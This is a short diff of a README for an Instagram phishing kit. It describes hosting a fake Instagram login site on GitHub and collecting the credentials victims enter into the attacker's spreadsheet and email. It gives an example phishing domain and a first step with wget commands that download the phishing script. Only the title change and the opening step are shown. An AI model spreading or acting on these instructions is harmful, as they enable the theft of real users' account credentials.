@@ -1,4 +1,4 @@
-<h3> INSTAGRAM HOSTED PHISING </h3>
+<h3> INSTAGRAM HOSTED PHISING (ANDROID OR ANY OTHER DEVICE)</h3>
 
 * Showing how to host a Phishing site in Github and get victim entered data to you're spreadsheet and get a submitted mail ⚡👀
 Ex: <a href="https://instagramloginapp.ml">INSTAGRAMLOGINAPP.ML</a>
@@ -6,6 +6,7 @@ Ex: <a href="https://instagramloginapp.ml">INSTAGRAMLOGINAPP.ML</a>
 
 #### STEP 1 (Clone the script)
 ```
+
 * pkg install wget
 * wget https://github.com/adithziva/instaphish
 ```
